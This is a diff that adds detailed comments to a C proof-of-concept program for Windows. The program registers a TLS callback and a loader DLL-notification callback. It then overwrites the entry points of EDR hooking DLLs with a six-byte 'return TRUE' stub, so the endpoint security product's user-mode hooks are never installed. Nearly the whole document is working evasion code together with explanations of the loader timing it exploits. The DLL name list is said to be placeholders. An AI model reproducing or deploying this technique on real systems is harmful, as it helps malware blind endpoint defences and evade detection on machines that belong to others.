@@ -25,6 +25,23 @@
  *                  inline hook (E9) lands in ntdll / KERNELBASE.
  *                  The images stay mapped.
  *
+ * Why this timing window exists
+ * -----------------------------
+ * During process creation the kernel queues an APC to the initial thread
+ * that will eventually map the EDR's user-mode DLLs. The user-mode loader
+ * (ntdll!LdrpInitializeProcess) runs first:
+ *
+ *   1. Loader processes the PE's TLS directory  --> tls_callback runs HERE
+ *   2. Loader calls NtTestAlert                 --> drains the APC queue
+ *   3. APC handler maps the EDR hooking DLLs
+ *   4. Loader calls DllMain on each new image   --> hooks are installed
+ *
+ * Because TLS callbacks (step 1) execute before NtTestAlert (step 2), the
+ * EDR images do not yet exist in the address space when our code runs. We
+ * cannot stub them yet, but we CAN register a DLL load notification. When
+ * the loader later maps each EDR DLL (step 3), it fires our notification
+ * BEFORE calling DllMain (step 4) -- and that is where we write the stub.
+ *
  * Verification on a lab VM: read ntdll!NtProtectVirtualMemory before and
  * after -- a clean stub keeps 4C 8B D1 B8 (byte +3 never replaced).
  *
@@ -61,69 +78,103 @@
  * LdrRegisterDllNotification stores a function pointer; the loader then
  * calls it on every DLL map. Reason LOADED arrives after the image is
  * mapped and before LdrpCallInitRoutine calls its DllMain -- the gap this
- * PoC lives in. The structs mirror what the loader hands over; they are
- * stable on Windows 10/11 but appear in no SDK header.
+ * PoC lives in. The structs below are undocumented ntdll internals: they
+ * do not appear in any Windows SDK header but have been stable across
+ * Windows 10 and 11 (verified through 10.0.26100). We declare them here
+ * so the code compiles without an ntdll import library or a DDK.
  */
 
+/* Layout of the notification payload for a freshly mapped DLL.
+ * The loader fills this in and passes a pointer to every registered
+ * notification callback. */
 typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
-    ULONG           Flags;
-    PUNICODE_STRING FullDllName;
-    PUNICODE_STRING BaseDllName;
-    PVOID           DllBase;
-    ULONG           SizeOfImage;
+    ULONG           Flags;          /* reserved, always 0 in practice    */
+    PUNICODE_STRING FullDllName;    /* full NT path, e.g. \??\C:\...     */
+    PUNICODE_STRING BaseDllName;    /* file basename only, e.g. foo.dll  */
+    PVOID           DllBase;        /* load address of the mapped image  */
+    ULONG           SizeOfImage;    /* virtual size of the mapped image  */
 } LDR_DLL_LOADED_NOTIFICATION_DATA;
 
+/* Union wrapper -- the loader can theoretically send UNLOADED payloads
+ * too (same layout), but only LOADED matters here. */
 typedef union _LDR_DLL_NOTIFICATION_DATA {
     LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
 } LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;
 
+/* Notification reason code: 1 = a DLL was just mapped into the process */
 #define LDR_DLL_NOTIFICATION_REASON_LOADED 1
 
+/* Signature the loader expects our callback to have */
 typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
     ULONG                      NotificationReason,
     PLDR_DLL_NOTIFICATION_DATA NotificationData,
     PVOID                      Context);
 
+/* Signature of the undocumented ntdll export that registers our callback.
+ * Resolved at runtime via GetProcAddress since there is no import lib. */
 typedef NTSTATUS (NTAPI *fnLdrRegisterDllNotification)(
     ULONG                          Flags,
     PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
     PVOID                          Context,
     PVOID                         *Cookie);
 
+/* One loader-list entry (LDR_DATA_TABLE_ENTRY), hand-declared. The PEB
+ * exposes PEB_LDR_DATA which owns three doubly-linked lists of these
+ * records (load order, memory order, init order). peb_stub_loaded()
+ * walks InMemoryOrderLinks. On x64 the PEB address lives at gs:[0x60]
+ * (the TEB's ProcessEnvironmentBlock field). */
 typedef struct _PC_LDR {
-    LIST_ENTRY     InLoadOrderLinks;
-    LIST_ENTRY     InMemoryOrderLinks;
-    LIST_ENTRY     InInitializationOrderLinks;
-    PVOID          DllBase;
-    PVOID          EntryPoint;
-    ULONG          SizeOfImage;
-    UNICODE_STRING FullDllName;
-    UNICODE_STRING BaseDllName;
+    LIST_ENTRY     InLoadOrderLinks;            /* links, load order     */
+    LIST_ENTRY     InMemoryOrderLinks;          /* links, memory order   */
+    LIST_ENTRY     InInitializationOrderLinks;  /* links, init order     */
+    PVOID          DllBase;                     /* module base address   */
+    PVOID          EntryPoint;                  /* module entry point    */
+    ULONG          SizeOfImage;                 /* virtual image size    */
+    UNICODE_STRING FullDllName;                 /* full path             */
+    UNICODE_STRING BaseDllName;                 /* basename for matching */
 } PC_LDR;
 
+/* Forward declaration -- registered with the loader in arm_notification() */
 static VOID CALLBACK on_dll_loaded(
     ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx);
 
 /* ========================================================================
  *  Name matching
- * ======================================================================== */
+ * ========================================================================
+ * Loader names arrive as length-counted UNICODE_STRING with arbitrary
+ * case. copy_uname normalises to a bounded C string; the matchers fold
+ * ASCII case and (for prefix_dll) require a real ".dll" suffix so a
+ * prefix like "edr_hook" cannot accidentally hit a config file named
+ * "edr_hook.cfg" or a directory entry with no extension.
+ */
 
+/* fold -- ASCII lowercase a single wide character.
+ * Non-ASCII characters pass through untouched; only A-Z is collapsed. */
 static wchar_t fold(wchar_t c)
 {
     return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
 }
 
+/* copy_uname -- convert a length-counted UNICODE_STRING into a
+ * null-terminated wide C string, clamped to the destination capacity.
+ * Returns the number of characters copied, or 0 on any bad input.
+ * Note: UNICODE_STRING.Length is in BYTES, not characters -- the
+ * division by sizeof(wchar_t) converts to char count. */
 static int copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
 {
     int n, i;
     if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
-    n = (int)(u->Length / sizeof(wchar_t));
+    n = (int)(u->Length / sizeof(wchar_t));  /* bytes -> characters */
     if (n >= cap) n = cap - 1;
     for (i = 0; i < n; i++) out[i] = u->Buffer[i];
     out[n] = 0;
     return n;
 }
 
+/* prefix_dll -- true if `name` starts with `prefix` (case-folded) AND
+ * ends with a literal ".dll" suffix. The suffix guard prevents prefix
+ * hits on non-DLL basenames like "edr_hook.cfg" or "edr_hook_helper.sys".
+ * Case is folded on both sides so "EDR_Hook12345.DLL" matches "edr_hook". */
 static int prefix_dll(const wchar_t *name, const wchar_t *prefix)
 {
     int i = 0, n = 0;
@@ -132,13 +183,15 @@ static int prefix_dll(const wchar_t *name, const wchar_t *prefix)
         if (fold(name[i]) != fold(prefix[i])) return 0;
         i++;
     }
-    if (!name[i]) return 0;
+    if (!name[i]) return 0;      /* prefix consumed the entire name */
     while (name[n]) n++;
-    if (n < 4) return 0;
+    if (n < 4) return 0;         /* too short to hold ".dll" */
     return fold(name[n-4]) == L'.' && fold(name[n-3]) == L'd'
         && fold(name[n-2]) == L'l' && fold(name[n-1]) == L'l';
 }
 
+/* wicmp -- case-insensitive wide string compare (folded ASCII only).
+ * Same contract as _wcsicmp: returns 0 when equal. */
 static int wicmp(const wchar_t *a, const wchar_t *b)
 {
     while (*a && *b) {
@@ -167,6 +220,14 @@ static int wicmp(const wchar_t *a, const wchar_t *b)
  *     for a case-insensitive full-name compare.
  *
  * The example entries below are non-functional placeholders.
+ *
+ * Typical naming conventions seen across various EDR products:
+ *   - Prefix + build number: "hookengine12345.dll" (version-stamped)
+ *   - Architecture suffix:   "hookclient64.dll" / "hookclient.dll"
+ *   - Internal codename:     "sensorcore.dll", "agentruntime.dll"
+ * Identifying the real names is part of the analysis; a debugger
+ * breakpoint on ntdll!LdrLoadDll or ntdll!LdrpSendDllNotifications
+ * in a lab VM reveals every image the loader maps at startup.
  */
 static int is_hooking_dll(const wchar_t *basename)
 {
@@ -191,8 +252,25 @@ static int is_hooking_dll(const wchar_t *basename)
 
 /* ========================================================================
  *  The write
- * ======================================================================== */
-
+ * ========================================================================
+ * stub_entry overwrites AddressOfEntryPoint of a freshly mapped image
+ * with "B8 01 00 00 00 C3" (mov eax, 1 ; ret).
+ *
+ * Why mov eax, 1?  The DllMain contract says: return nonzero for success.
+ * The loader calls the entry point expecting TRUE/FALSE; our stub returns
+ * 1 (TRUE) so the loader considers the DLL loaded and moves on -- but the
+ * real initialisation code (the one that plants inline hooks) never ran.
+ *
+ * Header walk: DllBase → MZ signature → e_lfanew offset → PE signature →
+ * OptionalHeader.AddressOfEntryPoint (RVA) → add to base = absolute VA.
+ * Both signatures are checked and the RVA must fit inside SizeOfImage.
+ *
+ * An entry that already holds the stub is left alone (idempotency), which
+ * also makes repeat notifications for the same image harmless. The page
+ * is flipped to PAGE_EXECUTE_READWRITE for the six-byte write because
+ * entry-point pages are normally PAGE_EXECUTE_READ; the original
+ * protection is restored immediately afterwards. ntdll is never touched.
+ */
 static void stub_entry(PVOID dll_base)
 {
     BYTE *base = (BYTE *)dll_base;
@@ -200,39 +278,55 @@ static void stub_entry(PVOID dll_base)
     IMAGE_NT_HEADERS *nt;
     DWORD ep_rva, old;
     BYTE *ep;
+    /* mov eax, 1 ; ret -- DllMain contract: nonzero means "load OK" */
     static const BYTE stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
 
-    if (!base) return;
+    if (!base) return;                                  /* null module     */
     dos = (IMAGE_DOS_HEADER *)base;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
-    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;    /* "MZ" check      */
+    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);    /* hop to PE hdr   */
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;    /* "PE\0\0" check  */
 
     ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
+    /* Reject a missing entry or one whose 6 bytes would run past the
+     * end of the mapped image */
     if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
         return;
-    ep = base + ep_rva;
+    ep = base + ep_rva;                     /* RVA -> absolute address     */
 
+    /* Idempotency: if the stub is already there, do nothing. Prevents
+     * double-writing and makes repeat notifications a safe no-op. */
     if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
         ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
         return;
 
+    /* Entry-point pages are normally PAGE_EXECUTE_READ -- temporarily
+     * make them writable. On failure, give up silently. */
     if (!VirtualProtect(ep, sizeof(stub), PAGE_EXECUTE_READWRITE, &old))
         return;
-    CopyMemory(ep, stub, sizeof(stub));
-    VirtualProtect(ep, sizeof(stub), old, &old);
+    CopyMemory(ep, stub, sizeof(stub));     /* the actual 6-byte write     */
+    VirtualProtect(ep, sizeof(stub), old, &old);  /* restore original prot */
 }
 
-/* Write A: stub every matching image that is ALREADY mapped at EXE TLS
- * time. Under the target timing window the loader list holds none of
- * the hooking DLLs yet -- this walk is the safety net, not the method. */
+/* Write A: stub every matching image that is ALREADY mapped when our TLS
+ * callback runs. On a normal start with APC-delivered hooks, the loader
+ * list holds only ntdll, kernel32, and a handful of system DLLs -- none
+ * of the EDR hooking modules, because those arrive via the APC that
+ * NtTestAlert has not yet drained. Write A is therefore the safety net,
+ * not the primary method: it covers EDR products that map their client
+ * DLL BEFORE EXE TLS (e.g. via a synchronous image-load kernel callback
+ * that completes before user-mode init). */
 static void peb_stub_loaded(void)
 {
+    /* Read the PEB directly from the x64 TEB: gs:[0x60] */
     PPEB peb = (PPEB)__readgsqword(0x60);
     LIST_ENTRY *head, *cur;
     if (!peb || !peb->Ldr) return;
+    /* Anchor on the InMemoryOrder module list */
     head = &peb->Ldr->InMemoryOrderModuleList;
+    /* Walk Flink until we wrap back to the head sentinel */
     for (cur = head->Flink; cur != head; cur = cur->Flink) {
+        /* Recover the enclosing module record from its link member */
         PC_LDR *mod = CONTAINING_RECORD(cur, PC_LDR, InMemoryOrderLinks);
         wchar_t name[256];
         if (!copy_uname(&mod->BaseDllName, name, 256)) continue;
@@ -241,58 +335,114 @@ static void peb_stub_loaded(void)
     }
 }
 
-/* Write B: the notification. Runs in LdrpSendDllNotifications, after
- * EXE TLS returned and NtTestAlert mapped the image, before
- * LdrpCallInitRoutine calls the real entry point. */
+/* Write B -- THIS IS THE PRIMARY METHOD.
+ *
+ * Call sequence inside the loader for each DLL mapped after NtTestAlert:
+ *
+ *   LdrpMapDllNtFileName        image mapped into address space
+ *   LdrpSendDllNotifications    our on_dll_loaded fires HERE
+ *      --> we overwrite AddressOfEntryPoint with the stub
+ *   LdrpCallInitRoutine         loader calls the entry it was always
+ *                               going to call -- it now hits our stub,
+ *                               returns 1, and the real DllMain (the
+ *                               one that installs inline hooks) never
+ *                               executes.
+ *
+ * The image stays mapped and listed in the PEB -- nothing is unloaded.
+ * The hooking DLL simply never initialised, so its writers / ordinals
+ * never ran and no E9 trampolines land in ntdll or KERNELBASE. */
 static VOID CALLBACK on_dll_loaded(
     ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx)
 {
     wchar_t name[256];
-    (void)ctx;
+    (void)ctx;                                       /* unused context    */
+    /* Only care about maps, not unloads */
     if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
     if (!data || !data->Loaded.BaseDllName) return;
     if (!copy_uname(data->Loaded.BaseDllName, name, 256)) return;
     if (!is_hooking_dll(name)) return;
+    /* Overwrite the entry point BEFORE the loader calls DllMain */
     stub_entry(data->Loaded.DllBase);
 }
 
+/* arm_notification -- resolve the undocumented ntdll export
+ * LdrRegisterDllNotification at runtime and store on_dll_loaded as our
+ * callback. This call writes zero entry-point bytes itself; it only
+ * tells the loader "call me when you map any DLL from now on".
+ * Registration is not retrospective: an image already mapped before this
+ * call is never reported again, which is why Write A (the PEB walk)
+ * exists as a separate pass. */
 static void arm_notification(void)
 {
     HMODULE ntdll;
     fnLdrRegisterDllNotification p_reg;
-    PVOID cookie = NULL;
+    PVOID cookie = NULL;                  /* registration handle, unused  */
 
+    /* ntdll is guaranteed mapped at this point */
     ntdll = GetModuleHandleW(L"ntdll.dll");
     if (!ntdll) return;
+    /* Resolve by name -- no import library exists for this export */
     p_reg = (fnLdrRegisterDllNotification)GetProcAddress(
         ntdll, "LdrRegisterDllNotification");
     if (!p_reg) return;
+    /* Flags=0, no context; cookie receives an opaque handle we discard */
     p_reg(0, on_dll_loaded, NULL, &cookie);
 }
 
 /* ========================================================================
  *  TLS callback and plumbing
- * ======================================================================== */
+ * ========================================================================
+ * The loader calls tls_callback during LdrpInitializeProcess because the
+ * PE's TLS directory names it. Three pieces cooperate to make the TLS
+ * directory exist and contain our function pointer:
+ *
+ *   1. .CRT$XLB section contribution   Our callback pointer is placed in
+ *      .CRT$XLB, which the MSVC CRT collects into the TLS callback array
+ *      (the "XL" family: XLA is the start sentinel, XLZ the end).
+ *
+ *   2. /INCLUDE:_tls_used               Forces the linker to keep the
+ *      _tls_used symbol (the CRT's TLS directory template), even though
+ *      nothing imports it by name. Without this the linker may dead-strip
+ *      the entire TLS directory and our callback never fires.
+ *
+ *   3. __declspec(thread) sentinel      A live thread-local variable
+ *      keeps the whole TLS apparatus from being optimised away. The
+ *      compiler sees TLS data is in use and preserves the directory.
+ *
+ * IMPORTANT: Inside the TLS callback the CRT is NOT initialised yet.
+ * No printf, no stdio, no CRT heap. Kernel32 calls (GetModuleHandleW,
+ * GetProcAddress, VirtualProtect, CopyMemory) are safe because kernel32
+ * is mapped and initialised before any EXE code runs. */
 
+/* tls_callback -- the process's TLS initialiser, invoked by the loader
+ * BEFORE main() and BEFORE the APC delivery that maps the EDR DLLs.
+ * This early slot is the entire timing advantage of the technique. */
 static void NTAPI tls_callback(PVOID h, DWORD reason, PVOID r)
 {
-    (void)h; (void)r;
+    (void)h; (void)r;                    /* instance + reserved unused    */
+    /* Only act on process attach; ignore thread attach/detach */
     if (reason != DLL_PROCESS_ATTACH) return;
-    peb_stub_loaded();
-    arm_notification();
+    peb_stub_loaded();    /* Write A: catch anything already mapped       */
+    arm_notification();   /* arm Write B: catch everything mapped later   */
 }
 
 #ifdef _MSC_VER
+/* Force the linker to emit the TLS directory */
 #pragma comment(linker, "/INCLUDE:_tls_used")
+/* Declare the CRT callback-collection section (XLB = TLS callbacks) */
 #pragma section(".CRT$XLB", long, read)
+/* Drop our callback pointer into .CRT$XLB so the loader calls it */
 __declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK g_tls_cb = tls_callback;
+/* A live __declspec(thread) variable keeps TLS from being optimised away */
 __declspec(thread) static volatile int g_tls_sentinel = 0;
 #else
 #error Build with MSVC /MT so the PE has a TLS directory.
 #endif
 
+/* The method is finished before main runs; main is only the container.
+ * To hold the process open for WinDbg, add Sleep(INFINITE) here. */
 int main(void)
 {
-    (void)g_tls_sentinel;
+    (void)g_tls_sentinel;  /* touch it so the compiler keeps TLS alive   */
     return 0;
 }
